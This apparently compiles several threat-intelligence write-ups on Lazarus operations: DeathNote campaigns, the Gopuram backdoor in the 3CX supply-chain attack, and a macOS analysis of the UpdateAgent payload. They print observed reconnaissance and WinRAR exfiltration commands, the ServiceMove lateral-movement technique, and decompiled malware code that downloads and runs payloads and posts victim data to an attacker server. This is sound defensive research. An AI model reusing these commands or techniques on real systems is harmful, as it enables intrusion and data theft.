Finally, this Trojanized PDF viewer overwrites the original opened file with a decoy PDF file and opens it to deceive the victim while implementing the malware payload. The payload is executed with command line parameters, and a shortcut file is created in the Startup folder to ensure persistence. This infection mechanism demonstrates the care and precision with which the actor delivers the payload.
Expanded target and adoption of new infection vector
In May 2021, we observed that an IT company in Europe that provides solutions for monitoring network devices and servers was compromised by the same cluster. It’s believed that the Lazarus group had an interest in this company’s widely used software or its supply chain.
In addition, in early June 2021, the Lazarus group began utilizing a new infection mechanism against targets in South Korea. One thing that caught our attention was that the initial stage of the malware was executed by legitimate security software that is widely used in South Korea. It’s thought that the malware was spread through a vulnerability in this widely used software in South Korea.
 
Infection chain
Similar to the previous case, the initial infection vector created the downloader malware. Once connected to the C2 server, the downloader retrieved an additional payload based on the operator’s commands and executed it in memory. During this time, the BLINDINGCAN malware was used as a memory-resident backdoor. While the BLINDINGCAN malware has sufficient capabilities to control the victim, the actor manually implanted additional malware. It’s believed that the group aims to create an auxiliary method to control the victim. The retrieved loader’s export function (CMS_ContentInfo) was launched with command line parameters, which is crucial for decrypting the embedded next-stage payload and configuration. This process only proceeds if the length of the parameter is 38. Finally, the COPPERHEDGE malware, previously used by this cluster, was executed on the victim.
Almost one year later, in March 2022, we discovered that the same security program had been exploited to propagate similar downloader malware to several victims in South Korea. However, a different payload was delivered in this case. The C2 operator manually implanted a backdoor twice, and although we were unable to acquire the initially implanted backdoor, we assume it is the same as the backdoor in the following stage. The newly implanted backdoor is capable of executing a retrieved payload with named-pipe communication. In addition, the actor utilized side-loading to execute Mimikatz and used stealer malware to collect keystroke and clipboard data from users.
 
Infection chain
Around the same time, we uncovered evidence that one defense contractor in Latin America was compromised by the same backdoor. The initial infection vector was similar to what we’ve seen with other defense industry targets, involving the use of a Trojanized PDF reader with a crafted PDF file. However, in this particular case, the actor adopted a side-loading technique to execute the final payload. When the malicious PDF file is opened with the Trojanized PDF reader, the victim is presented with the same malware mentioned above, which is responsible for collecting and reporting the victim’s information, retrieving commands and executing them using pipe communication mechanisms. The actor used this malware to implant additional payloads, including legitimate files for side-loading purposes.
•	Legitimate file: %APPDATA%\USOShared\CameraSettingsUIHost.exe
•	Malicious file: %APPDATA%\USOShared\dui70.dll
•	Config file: %APPDATA%\USOShared\4800-84dc-063a6a41c5c
•	Command line: %APPDATA%\USOShared\CameraSettingsUIHost.exe uTYNkfKxHiZrx3KJ
An ongoing attack targeting a defense contractor with updated infection tactics
In July 2022, we observed that the Lazarus group had successfully breached a defense contractor in Africa. The initial infection was a suspicious PDF application, which had been sent via the Skype messenger. After executing the PDF reader, it created both a legitimate file (CameraSettingsUIHost.exe) and malicious file (DUI70.dll) in the same directory. This attack heavily relied on the same DLL side-loading technique that we observed in the previous case. The payload that was initially implanted and executed by the PDF reader was responsible for collecting and reporting the victim’s information, as well as retrieving an additional payload from the remote server named LPEClient. The Lazarus group used this malware several times in various campaigns. They have also utilized the same DLL side-loading technique to implant additional malware that is capable of backdoor operation. In order to move laterally across systems, the actor used an interesting technique called ServiceMove. This technique leverages the Windows Perception Simulation Service to load arbitrary DLL files. According to the author’s explanation, ‘a non-existing DLL file will be loaded every time when the Windows Perception Simulation Service is started’. By creating an arbitrary DLL in C:\Windows\System32\PerceptionSimulation\ and starting the service remotely, the actors were able to achieve code execution as NT AUTHORITY\SYSTEM on a remote system. The actor created a devobj.dll file in the PerceptionSimulation folder and remotely executed the PerceptionSimulation service. Upon launching the devobj.dll file, it decrypted an encrypted backdoor file, PercepXml.dat, from the same folder and executed it in memory.
 
Infection chain
Post-exploitation
During our investigation of this campaign, we have gained extensive insight into the Lazarus group’s post-exploitation strategy. After initial infection, the operator executed numerous Windows commands to gather basic system information and attempt to find valuable hosts, such as an Active Directory server. Before moving laterally, the Lazarus group acquired Windows credentials using well-known methods, and employed public techniques, such as ServiceMove. When the group completed its mission and began exfiltrating data, they mostly utilized the WinRAR utility to compress files and transmit them via C2 communication channels.
Phase	Examples
Basic reconnaissance	Generally used Windows commands. For example:
•	cmd.exe /c netstat -ano | find TCP
•	systeminfo
In one case, they accessed the default domain controllers policy directly.
•	cmd.exe /c “Type “\\[redacted]\SYSVOL\[redacted]\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf”
Finding high-value hosts	To find a connected Remote Desktop host it utilized Windows commands or queried the saved server list from the registry.
•	cmd.exe /c netstat -ano | findstr 3389
•	cmd.exe /c reg query HKEY_USERS\S-1-5-[redacted]-1001\Software\Microsoft\Terminal Server Client\Servers
Utilizing ADFind tool to acquire Active directory information.
•	cmd.exe /c “%appdata%\[redacted].xic -b dc=[redacted],dc=[redacted] -f “sAMAccountName=[redacted]” >> %temp%\dm3349.tmp 2>&1″
Acquiring login credentials	Utilizing crafted Mimikatz to dump login credentials or Responder tool to capture credentials.
Lateral movement	One common approach for launching commands on remote hosts is to use methods like SMB connection or the ServiceMove technique.
Exfiltration	Using WinRAR to archive files before sending the stolen file via C2 channel.
•	adobearm.exe a -hp1q2w3e4 -m5 -v2000000k “%Local AppData%\Adobe\SYSVOL800.CHK” “\\[redacted]FILE02.[redacted]\Projects\[redacted] Concept Demonstrator”
•	%appdata%\USOShared\USOShared.LOG1 a -hpb61de03de6e0451e834db6f185522bff -m5 “%appdata%\USOShared\USOShared.LOG2” “%appdata%\ntuser.001.dat”
Attribution
After tracking the DeathNote cluster and its origin, we have determined that the Lazarus group is responsible for this malware strain. Our conclusion is supported by many security vendors who also believe that the Lazarus group is linked to this malware. Furthermore, we have analyzed the delivery of Windows commands to the victim through the DeathNote malware, and discovered that a significant number of commands were executed between GMT 00:00 and 07:00. Based on our knowledge of normal working hours, we can infer that the actor is located in either the GMT+08 or GMT+09 time zone.
 
Timeline of Windows commands
Moreover, the actor left a Korean comment ‘정상호출’, which translates to ‘normal call’ in the C2 script. This further supports the hypothesis that Lazarus is a Korean-speaking actor.
 
Korean comment in the C2 script
In conclusion, the Lazarus group is a notorious and highly skilled threat actor. Our analysis of the DeathNote cluster reveals a rapid evolution in its tactics, techniques and procedures over the years. As the Lazarus group continues to refine its approaches, it is crucial for organizations to maintain vigilance and take proactive measures to defend against its malicious activities. By staying informed and implementing strong security measures, organizations can reduce the risk of falling victim to this dangerous adversary.
Indicators of Compromise
Beginning of tracking DeathNote
Malicious documents
265f407a157ab0ed017dd18cae0352ae
7a73a2261e20bdb8d24a4fb252801db7
7a307c57ec33a23ce9b5c84659f133cc
ced38b728470c63abcf4db013b09cff7
9121f1c13955506e33894ffd780940cd
50b2154de64724a2a930904354b5d77d
8a05f6b3f1eb25bcbceb717aa49999cd
ee73a772b72a5f3393d4bf577fc48efe
Downloader
d1c652b4192857cb08907f0ba1790976
25b37c971fd7e9e50e45691aa86e5f0a
0493f40628995ae1b7e3ffacd675ba5f
8840f6d2175683c7ed8ac2333c78451a
c278d6468896af3699e058786a8c3d62
9fd35bad075c2c70678c65c788b91bc3
59cb8474930ae7ea45b626443e01b66d
7af59d16cfd0802144795ca496e8111c
cd5357d1045948ba62710ad8128ae282
77194024294f4fd7a4011737861cce3c
e9d89d1364bd73327e266d673d6c8acf
0d4bdfec1e657d6c6260c42ffdbb8cab
5da86adeec6ce4556f477d9795e73e90
706e55af384e1d8483d2748107cbd57c
Manipulated Installer
dd185e2bb02b21e59fb958a4e12689a7
Installer
4088946632e75498d9c478da782aa880 C:\Windows\igfxmon.exe
Injector
dc9244206e72a04d30eeadef23713778 C:\Windows\system32\[random 2 bytes]proc.exe
Backdoor
735afcd0f6821cbd3a2db510ea8feb22 C:\Windows\system32\[random 2 bytes]svc.dll
Shifting focus to the defense industry
Malicious documents
4c239a926676087e31d82e79e838ced1 pubmaterial.docx
183ad96b931733ad37bb627a958837db Boeing_PMS.docx
9ea365c1714eb500e5f4a749a3ed0fe7 Boeing_DSS_SE.docx
2449f61195e39f6264d4244dfa1d1613 Senior_Design_Engineer.docx
880b263b4fd5de0ae6224189ea611023 LM_IFG_536R.docx.docx
e7aa0237fc3db67a96ebd877806a2c88 Boeing_AERO_GS.docx
56470e113479eacda081c2eeead153bf boeing_spectrolab.docx
Fetched template
2efbe6901fc3f479bc32aaf13ce8cf12 pubmaterial.dotm
65df11dea0c1d0f0304b376787e65ccb 43.dotm
0071b20d27a24ae1e474145b8efc9718 17.dotm
1f254dd0b85edd7e11339681979e3ad6 61.dotm
DeathNote downloader
f4b55da7870e9ecd5f3f565f40490996 onenote.db, thumbnail.db
2b02465b65024336a9e15d7f34c1f5d9 wsuser.db
11fdc0be9d85b4ff1faf5ca33cc272ed onenote.db
f6d6f3580160cd29b285edf7d0c647ce
78d42cedb0c012c62ef5be620c200d43 wsuser.db
92657b98c2b4ee4e8fa1b83921003c74
075fba0c098d86d9f22b8ea8c3033207 wsdts.db
8fc7b0764541225e5505fa93a7376df4
7d204793e75bb49d857bf4dbc60792d3 2.dll
eb2dc282ad3ab29c1853d4f6d09bec4f
ca6658852480c70118feba12eb1be880 thumbnail.db
c0a8483b836efdbae190cc069129d5c3 wsdts.db
14d79cd918b4f610c1a6d43cadeeff7b wsuser.db
1bd0ca304cdecfa3bd4342b261285a72
Trojanized PDF viewer
cbc559ea38d940bf0b8307761ee4d67b SumatraPDF.exe
da1dc5d41de5f241cabd7f79fbc407f5 internal pdf viewer.exe
Expanded target and adoption of new infection vector
Racket Downloader
b3a8c88297daecdb9b0ac54a3c107797 SCSKAppLink.dll
BLIDINGCAN
b23b0de308e55cbf14179d59adee5fcb
64e5acf43613cd10e96174f36cb1d680
COPPERHEDGE Loader
a43bdc197d6a273102e90cdc0983b0b9
COPPERHEDGE
97336f5ce811d76b28e23280fa7320b5
Downloader Loader
f821ca4672851f02bead3c4bd23bed84 c:\officecache\officecert.ocx
Racket Downloader
b974bc9e6f375f301ae2f75d1e8b6783 %public%\Libraries\SCSKAppLink.dll
eb061dfacb3667cf65d250911179235d
Stealer
fe549a0185813e4e624104d857f9277b %ProgramData%\GenICam\GenICamKDR.gic
Backdoor Loader
7b8960e2a22c8321789f107a7b83aa59 %ProgramData%\xilinx\xilinx.pkg
0ac90c7ad1be57f705e3c42380cbcccd %ProgramData%\USOShared\USOShare.cpl
Mimikatz Loader
adf0d4bbefccf342493e02538155e611 %ProgramData%\USOShared\log.dll
d4d654c1b27ab90d2af8585052c77f33
An ongoing attack targeting a defense contractor with updated infection tactics
Loader
2bcf464a333d67afeb80360da4dfd5bb C:\Windows\system32\perceptionsimulation\devobj.dll
83dd9b600ed33682aa21f038380a6eab C:\Windows\system32\perceptionsimulation\devobj.dll
ForestTiger(Backdoor)
97524091ac21c327bc783fa5ffe9cd66 ProgramData\adobe\arm\lockhostingframework.dll
9b09ebf52660a9d6deca21965ce52ca1 %appdata%\adobe\arm\DUI70.dll
26c0f0ce33f5088754d88a1db1e6c4a9
Trojanized PDF reader
84cd4d896748e2d52e2e22d1a4b9ee46 SecurePDF.exe
 
Not just an infostealer: Gopuram backdoor deployed through 3CX supply chain attack
APT REPORTS
03 APR 2023
 4 minute read
 
AUTHORS
•	 GEORGY KUCHERIN
•	 VASILY BERDNIKOV
•	 VILEN KAMALOV
On March 29, Crowdstrike published a report about a supply chain attack conducted via 3CXDesktopApp, a popular VoIP program. Since then, the security community has started analyzing the attack and sharing their findings. The following has been discovered so far:
•	The infection is spread via 3CXDesktopApp MSI installers. An installer for macOS has also been trojanized.
•	The malicious installation package contains an infected dll library that decrypts a shellcode from the d3dcompiler_47.dll library’s overlay and executes it.
•	The decrypted payload extracts C2 server URLs from icons stored in a GitHub repository (the repository is removed).
•	The payload connects to one of the C2 servers, downloads an infostealer and starts it.
•	The infostealer collects system information and browser history, then sends it to the C2 server.
As we reviewed available reports on the 3CX attack, we began wondering if the compromise concluded with the infostealer or further implants followed. To answer that question, we decided to review the telemetry we had on the campaign. On one of the machines, we observed a DLL named guard64.dll, which was loaded into the infected 3CXDesktopApp.exe process. Interestingly enough, we opened an investigation into a case linked to that DLL on March 21, about a week before the supply chain attack was discovered. A DLL with that name was used in recent deployments of a backdoor that we dubbed “Gopuram” and had been tracking internally since 2020. Three years ago, we were investigating an infection of a cryptocurrency company located in Southeast Asia. During the investigation, we found that Gopuram coexisted on victim machines with AppleJeus, a backdoor attributed to the Korean-speaking threat actor Lazarus.
Over the years, we observed few victims compromised with Gopuram, but the number of infections began to increase in March 2023. As it turned out, the increase was directly related to the 3CX supply chain attack. We found out that the threat actor specifically targeted cryptocurrency companies, dropping the following files on infected machines:
•	C:\Windows\system32\wlbsctrl.dll, a malicious library (MD5: 9f85a07d4b4abff82ca18d990f062a84);
•	C:\Windows\System32\config\TxR\.TxR.0.regtrans-ms, an encrypted shellcode payload.
Once dropped, wlbsctrl.dll becomes loaded on every startup by the IKEEXT service via DLL hijacking. We further saw DLLs with the names ualapi.dll and ncobjapi.dll being sideloaded into spoolsv.exe and svchost.exe, respectively.
The wlbsctrl.dll library is responsible for decrypting and executing the shellcode stored in the C:\Windows\System32\config\TxR directory. The decryption is notably performed through the CryptUnprotectData API function that uses a different encryption key internally on every machine. This makes it difficult for researchers to decrypt the payload from the file without physical access to the victim machines.
 
Snippet of the loading function using CryptUnprotectData
The component loaded by the library is Gopuram’s main module. As mentioned above, its name in the export directory is guard64.dll. The job of the main module is to connect to a C2 server and request commands. The backdoor implements commands that allow the attackers to interact with the victim’s file system and create processes on the infected machine. Gopuram was additionally observed to launch in-memory modules. Just like the implants used in the 3CX campaign, Gopuram’s modules are DLL files that include an export function named DllGetClassObject. We have observed nine modules so far:
Module name	Description
Ping	Pings a host specified in the argument.
Connect	Connects to a given host via a socket and waits for the server to send data.
Registry	Manipulates registry (lists, adds, deletes and exports keys).
Service	Manipulates (creates, lists, starts, stops and deletes) services.
Timestomp	Performs timestomping on files.

Inject	Performs payload injections through syscalls via mapping a shellcode to a remote process and creating a remote thread.
KDU	Kernel Driver Utility that allows an attacker to bypass driver signature enforcement. The utility is used to load an unsigned driver (MD5: F684E10FF1FFCDD32C62E73A11382896). The driver collects information about installed AV filters and writes it to the C:\Windows\System32\catroot2\edb.chk.log file.
Update	Encrypts a provided payload and writes it to the C:\Windows\System32\config\TxR\.TxR.0.regtrans-ms file.
Net	Partially implements features of the net command: management of users, groups, sessions and network shares.
The discovery of the new Gopuram infections allowed us to attribute the 3CX campaign to the Lazarus threat actor with medium to high confidence. Our attribution is based on the following facts:
•	While investigating an attack on a Southeast Asian cryptocurrency company in 2020, we found Gopuram coexisting on the same machine with the AppleJeus backdoor, which is attributed to Lazarus.
•	The Gopuram backdoor has been observed in attacks on cryptocurrency companies, which is aligned with the interests of the Lazarus threat actor.
•	While looking for additional implants that used the same loader shellcode as the 3CX implants, we discovered a sample on a multiscanner service (MD5: 933508a9832da1150fcfdbc1ca9bc84c) loading a payload that uses the wirexpro[.]com C2 server. The same server is listed as an IoC for an AppleJeus campaign by Malwarebytes.
 
First bytes of the loader shellcode used in 3CX and AppleJeus
Note, though, that the shellcode is based on open-source code that has been used by other threat actors, for example, SilentBreak. Still, the use of that shellcode along with the 0xF558F4DA constant (which is the ROR13 hash for the string DllGetClassObject) is a more unique pattern.
•	While investigating a malicious MSI file (MD5: ec3f99dd7d9dbce8d704d407b086e84f) that has been uploaded to a multiscanner service, we observed the following two events:
•	The dll library dropped from the MSI was observed to launch an in-memory payload that contacts the oilycargo[.]com domain. This domain name has previously been attributed to Lazarus by multiple researchers.
•	In our telemetry, we observed AvBugReport.exe, the executable hosting dll, to contain Gopuram’s main module payload, guard64.dll.
These four facts allow us to conclude that Lazarus is likely the threat actor deploying the Gopuram backdoor.
As for the victims in our telemetry, installations of the infected 3CX software are located all over the world, with the highest infection figures observed in Brazil, Germany, Italy and France.
As the Gopuram backdoor has been deployed to less than ten infected machines, it indicates that attackers used Gopuram with surgical precision. We additionally observed that the attackers have a specific interest in cryptocurrency companies.
As it turns out, the infostealer is not the only malicious payload deployed during the 3CX supply chain attack. The threat actor behind Gopuram additionally infects target machines with the full-fledged modular Gopuram backdoor. We believe that Gopuram is the main implant and the final payload in the attack chain. Our investigation of the 3CX campaign is still far from complete. We will continue analyzing the deployed implants to find out more details about the toolset used in the supply chain attack.
Gopuram indicators of compromise
MD5 hashes
9f85a07d4b4abff82ca18d990f062a84
96d3bbf4d2cf6bc452b53c67b3f2516a
File paths
C:\Windows\System32\config\TxR\.TxR.0.regtrans-ms
C:\Windows\system32\catroot2\edb.chk.log
More indicators of compromise and YARA rules for detecting Gopuram components are available for TIP subscribers. Contact intelreports@kaspersky.com for more details.
 
Ironing out (the macOS) details of a Smooth Operator (Part II)
Analyzing UpdateAgent, the 2nd-stage macOS payload of the 3CX supply chain attack
by: Patrick Wardle / April 1, 2023
Objective-See's research, tools, and writing, are supported by the "Friends of Objective-See" such as:
 

Jamf

 
 

Mosyle

 
 

Kandji

 
 

CleanMyMac X

 
 

Kolide

 
 
Fleet

 
 
Palo Alto Networks

 
 
Sophos



📝 👾 Want to play along?
As “Sharing is Caring” I’ve uploaded the malicious binary UpdateAgent to our public macOS malware collection. The password is: infect3d
...please though, don't infect yourself!


Background
Earlier this week, I published a blog post that added a missing puzzle piece to the 3CX supply chain attack (attributed to the North Koreans, aka Lazarus Group).
In that post, we uncovered the trojanization component of macOS variant of the attack, comprehensively analyzed it, and provided IoCs for detection. I’d recommend reading that write up, as this post, part II, continues on from were that left off.
"Ironing out (the macOS details) of a Smooth Operator (Part I)"
We ended the previous post, noting the main goal of the 1st-stage payload (libffmpeg.dylib) was to download and execute a 2nd-stage payload named UpdateAgent. The following snippet of annotated decompiled code, from the 1st-stage payload shows this logic:
//write out 2nd-stage payload "UpdateAgent"
// which was just downloaded from the attacker's server
stream = fopen(path2UpdateAgent, "wb");
fwrite(bytes, length, 0x1, stream);
fflush(stream);
fclose(stream);

//make +x
chmod(path2UpdateAgent, 755);
            
//execute
popen(path2UpdateAgent, "r");
As the attacker’s servers were offline at the time of my analysis, I was unable to grab a copy of the UpdateAgent binary …leading me to state, “what it does is a mystery”.
But now with the UpdateAgent binary in my possession, let’s solve the mystery of what it does!
Note: In order to get as much information out as quickly as possible I originally tweeted my analysis of the UpdateAgent:
…this post both reiterates that initial analysis and builds upon it (and hey a blog post is a little more readable and ‘official’).
Triage
The (SHA-1) hash for the UpdateAgent was originally published in SentinelOne report: 9e9a5f8d86356796162cee881c843cde9eaedfb3
 
UpdateAgent's Hash (image credit: SentinelOne)
WhatsYourSign shows other hashes (MD5, etc):
 
(other) hashes
You can also see that WhatsYourSign has determine that though UpdateAgent is signed, its signature is adhoc (and thus not notarized). You can confirm this with macOS’s codesign utility as well:
% codesign -dvvv UpdateAgent 
Executable=/Users/patrick/Library/Application Support/3CX Desktop App/UpdateAgent
Identifier=payload2-55554944839216049d683075bc3f5a8628778bb8
CodeDirectory v=20100 size=450 flags=0x2(adhoc) hashes=6+5 location=embedded
...
Signature=adhoc
Also from UpdateAgent’s code signing information, we can see it’s identifier: payload2-55554944839216049d683075bc3f5a8628778bb8. Other Lazarus group payloads are also signed adhoc and use a similar identifier scheme. For example check out the code signing information from Lazarus’s AppleJuice.C:
% codesign -dvvv AppleJeus/C/unioncryptoupdater 
Executable=/Users/patrick/Malware/AppleJeus/C/unioncryptoupdater
Identifier=macloader-55554944ee2cb96a1f5132ce8788c3fe0dfe7392
CodeDirectory v=20100 size=739 flags=0x2(adhoc) hashes=15+5 location=embedded
Hash type=sha256 size=32

Signature=adhoc
Using macOS’s file command, we see the UpdateAgent binary is an x86_64 (Intel) Mach-O:
% file UpdateAgent 
UpdateAgent: Mach-O 64-bit executable x86_64
…this means that unless Rosetta is installed, it won’t run on Apple Silicon. (Recall that the arm64 version of the 1st payload, libffmpeg.dylib was not trojanized).
Let’s now run the strings command (with the "-" option which instructs it to scan the whole file), we find strings that appear to be related to:
•	Config files
•	Config parameters
•	Attacker server (sbmsa[.]wiki)
•	Method names of networking APIs
% strings -a UpdateAgent 

%s/Library/Application Support/3CX Desktop App/.main_storage
%s/Library/Application Support/3CX Desktop App/config.json

"url": "https://
"AccountName": "

https://sbmsa.wiki/blog/_insert
3cx_auth_id=%s;3cx_auth_token_content=%s;__tutma=true

URLWithString:
requestWithURL:
addValue:forHTTPHeaderField:
dataTaskWithRequest:completionHandler:
This wraps up our triage of the UpdateAgent binary. Time to dive in deeper with our trusty friends: the disassembler and debugger!
Analysis of UpdateAgent
In this section we’ll more deeply analyze the malicious logic of the UpdateAgent binary.
Throwing the binary in a debugger (starting at its main), we see within the first few lines of code the malware contain some basic anti-analysis logic.
•	Forks itself via fork
This slightly complicates debugging, as forking creates a new process (vs. the parent, we’re debugging).
•	Self-deletes via ulink
This can thwart file-based AV scanners, or simply make it harder to find/grab the binary for analysis!
int main(int argc, const char * argv[]) {

    if (fork() == 0) {

            //in child

            ...
            unlink(argv[0]);
    else
        exit(0);
As noted, when fork executes, a new (child) process is created. We can see that in the above disassembly, the parent will then exit …while the child will continue on executing. So, if we’re debugging the parent our debugging session will terminate. There are debugger commands that can follow the child, but IMHO its easier to just set a breakpoint on the fork, then skip over it (via the register write $pc 
) altogether.
We also noted the child process (the parent has exited), will delete itself via the unlink API. This is readily observable via a file monitor, which capture thes ES_EVENT_TYPE_NOTIFY_UNLINK event of the UpdateAgent file by the UpdateAgent process:
# FileMonitor.app/Contents/MacOS/FileMonitor -pretty -json -filter UpdateAgent
{
  "event" : "ES_EVENT_TYPE_NOTIFY_UNLINK",
  "file" : {
    "destination" : "~/Library/Application Support/3CX Desktop App/UpdateAgent",
    ...
    "process" : {
        "pid" : 38206,
        "name" : "UpdateAgent",
        "path" : "~/Library/Application Support/3CX Desktop App/UpdateAgent"
    }
  }
}
Next, as the malware has not stripped its symbols nor obfuscated its strings, in a disassembler see the malware performing the following:
•	Calls a function called parse_json_config
•	Calls a function called read_config
•	Calls a function named enc_text
•	Builds a string ("3cx_auth_id=..." + ?)
•	Calls a function named send_post passing in the URI https://sbmsa.wiki/blog/_insert
Let’s explore each of these, starting with the call to the malware’s parse_json_config function.
This attempts to open a file, config.json (in ~/Library/Application Support/3CX Desktop App). According to an email I received (thanks Adam!) this appears to be a legitimate configuration file, that is part of 3CX’s app.
We can observe the malware opening the configuration file in a file monitor:

# FileMonitor.app/Contents/MacOS/FileMonitor -pretty -json -filter UpdateAgent
{
  "event" : "ES_EVENT_TYPE_NOTIFY_OPEN",
  "file" : {
    "destination" : "~/Library/Application Support/3CX Desktop App/config.json",
    ...
    "process" : {
        "pid" : 38206,
        "name" : "UpdateAgent",
        "path" : "~/Library/Application Support/3CX Desktop App/UpdateAgent"
    }
  }
}

Once it has opened this file, UpdateAgent looks for values from the keys: url and AccountName, as we can see in the annotated disassembly:
int parse_json_config(int arg0) {
    ...

    sprintf(&var_1230, "%s/Library/Application Support/3CX Desktop App/config.json", arg0);
    rax = fopen(&var_1230, "r");

    ...

    fread(&var_1030, rsi, 0x1, r12);
    rax = strstr(&var_1030, "\"url\": \"https://");

    ...
    rax = strstr(&var_1030, "\"AccountName\": \"");
Here’s a snippet from a legitimate 3CX config.json file, showing an example of such values:
{
    "ProvisioningSettings": {
        "url": "https://servicemax.3cx.com/provisioning///.xml",
        "file": {
            "Extension": "00",
            ...
            "GCMSENDERID": "",
            "AccountName": "",
From this, we can see the url key appears to contain a link to the xml provisioning file for the VOIP system. On the other hand, AccountName is full name of the account owner.
If the config.json file is not found, the malware exits. As I didn't have the 3CX app fully installed, to keep the malware happily executing so I could continue (dynamic) analysis I created a dummy config.json (containing the expected keys, with some random values).
With the values of url and AccountName extracted from the config.json file the malware then calls a function named read_config.
This opens and then reads in the contents of the .main_storage file. Recall that this file created by the 1st-stage payload (libffmpeg.dylib) and contains a UUID - likely uniquely identifying the victim. The read_config function then de-XORs the UUID with the key 0x7a.
int read_config(int * arg0, void * arg1) {
    ...

    sprintf(&var_230, "%s/Library/Application Support/3CX Desktop App/.main_storage", arg0);
    handle = fopen(&var_230, "rb");
    fread(buffer, 0x38, 0x1, rax);
    fclose(handle);
    
    index = 0x0;
    do {
        *(buffer + index) = *(buffer + index) ^ 0x7a;
        index++;
    } while (index != 0x38);
Once the read_config has returned, the malware concatenates the url and AccountName and then encrypts them via a function named enc_text. Next it combines this encrypted string with the de-XOR’d UUID (from the .main_storage file).
These values are combined in the following parameterized string:
3cx_auth_id=UUID;3cx_auth_token_content=encryted url;account name;__tutma=true
We can dump this in a debugger:
% lldb UpdateAgent

...

(lldb) x/s 0x304109390: "3cx_auth_id=3725e81e-0519-7f09-72ac-35641c94c1cf;3cx_auth_token_content=S&per>ogZZGA55{ujj[MCC3&dol>wweZPP@&semi>4#riiZLBB7&dol>vvfZOOA93&per>vqeSJJ?-!!pbWWE@&semi>0xppZQII5&plus>}}sjb;__tutma=true"

Now the malware is ready to send this information to the attacker’s remote server. This is accomplished via a function the malware names send_post. It takes as several parameters including the remote server/API endpoint https://sbmsa.wiki/blog/_insert and the 3cx_auth_id=... string:
enc_text(&input, &output);
sprintf(¶mString, "3cx_auth_id=%s;3cx_auth_token_content=%s;__tutma=true", &UUID, &output);

...
send_post("https://sbmsa.wiki/blog/_insert", ¶mString, &var_1064);
                                   
The send_post function configures an URL request with a hard-coded user-agent string ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Safari/537.36) and add the 3cx_auth_id=... parameter string in the “Cookie” HTTP header.
Then, via the nsurlsession’s dataTaskWithRequest:completionHandler: method the malware makes the request to https://sbmsa.wiki/blog/_insert.
Via my DNSMonitor, we can observe (the initial part, the DNS resolution) of this:
% DNSMonitor.app/Contents/MacOS/DNSMonitor -json -pretty
[{
  "Process" : {
    "pid" : 40063,
    "signing ID" : "payload2-55554944839216049d683075bc3f5a8628778bb8",
    "path" : "\/Users\/patrick\/Library\/Application Support\/3CX Desktop App\/UpdateAgent"
  },
  "Packet" : {
    "Opcode" : "Standard",
    "QR" : "Query",
    "Questions" : [
      {
        "Question Name" : "sbmsa.wiki",
        "Question Class" : "IN",
        "Question Type" : "?????"
      }
    ],
    "RA" : "No recursion available",
    "Rcode" : "No error",
    "RD" : "Recursion desired",
    "XID" : 25349,
    "TC" : "Non-Truncated",
    "AA" : "Non-Authoritative"
  }
}
…unfortunately (for our continued analysis efforts) as the sbmsa.wiki server is offline, the connection fails.
% nslookup sbmsa.wiki
;; connection timed out; no servers could be reached
Still, we can continue static analysis of the UpdateAgent binary to see what it would do if the attacker’s server was (still) online.
…the answer is though, appears to be, nothing:
int main(int argc, const char * argv[]) {
...

response = send_post("https://sbmsa.wiki/blog/_insert", ¶mString, &var_1064);
if (response != 0x0) {
    free(response);
}

return 0; 
As the decompilation shows, once the send_post returns, the response is freed. Then, the function, returns. As the function (that invokes send_post and then simply returns) is main, this means the process is exiting.
This might at first seem a bit strange …wouldn’t we expect the UpdateBinary to do something after it has received a response? Usually we see malware treating a response as tasking (and thus then executing some attacker-specified commands), or, as was the case with the 1st-stage payload, saving and executing the response as an next-stage payload.
However if take a closer look at UpdateAgent’s URI API endpoint, recall it’s https://sbmsa.wiki/blog/_insert …maybe the purpose of UpdateAgent is simply to report information about its victims …inserting them into some back-end server (found at the _insert endpoint). This would make sense a supply-chain attacks indiscriminately infect a large number of victims, most of whom to a nationstate APT group (e.g. Lazarus) are of little interest.
This concept is well articulated by J. A. Guerrero-Saade who noted:
That’s up to say, the [supply-chain] attacker gets thousands of victims, collects everything they need for future compromises, profiles their haul, and decides how to maximize that access.
Also worth recalling that each time the 1st-stage payload was run, it would (re)download and (re)execute UpdateAgent …meaning at any time the Lazarus group hacker’s could for targets of interest, update/swap out the UpdateAgent’s code, perhaps for a persistent, fully featured implant.
Detection / Protection
Let’s end by talking how to detect and protect against this 2nd-stage payload.
First, detection should be trivial, as many of components of the malware are hard-coded and thus static:
File based IoCs (found in ~/Library/Application Support/3CX Desktop App/)
•	.main_storage
•	UpdateAgent (though as this self-deletes, it might be gone)
Embedded Domain:
•	https://sbmsa.wiki/blog/_insert
In terms of detentions, Objective-See’s free open-source tools can help!
First, BlockBlock (running in “Notarization” mode) will both detect and block UpdateAgent before it’s allowed to execute …as the malware is not notarized:
 
BlockBlock ...block blocking!
At the network level, as we showed earlier DNSMonitor, will detect when the malware attempts to resolve the domain named of its remote server:

% DNSMonitor.app/Contents/MacOS/DNSMonitor -json -pretty
[{
  "Process" : {
    "pid" : 40063,
    "signing ID" : "payload2-55554944839216049d683075bc3f5a8628778bb8",
    "path" : "\/Users\/patrick\/Library\/Application Support\/3CX Desktop App\/UpdateAgent"
  },
  "Packet" : {
    "Opcode" : "Standard",
    "QR" : "Query",
    "Questions" : [
      {
        "Question Name" : "sbmsa.wiki",
        "Question Class" : "IN",
        "Question Type" : "?????"
      }
    ],
    "RA" : "No recursion available",
    "Rcode" : "No error",
    "RD" : "Recursion desired",
    "XID" : 25349,
    "TC" : "Non-Truncated",
    "AA" : "Non-Authoritative"
  }
}
Finally LuLu can also detect the malware’s unauthorized network access. What really can tip us off that something is amiss based on LuLu’s alert is that the program, UpdateAgent accessing the internet has self-deleted (and thus is struck through in the alert):
 
LuLu ...detecting unauthorized network access
Make sure you are running the latest version of LuLu (v2.4.3) that improved the handling of self-deleted processes.
Conclusion
Today we added a missing yet another puzzle piece to the 3CX supply chain attack. Here, for the first time, we detailed the attacker’s 2nd macOS payload: UpdateAgent.
Moreover, we provided IoCs for detection and described how our free, open-source tools could provide protection, even with no a priori knowledge of this threat!
I want to end by including an awesome diagrammatic overview of (macOS components) of the 3CX supply chain attack, created by the talented Thomas Roccia, as it provides a great visual overview of what we covered in both our part I and part II writeups!
 
Initial Implants and Network Analysis Suggest the 3CX Supply Chain Operation Goes Back to Fall 2022
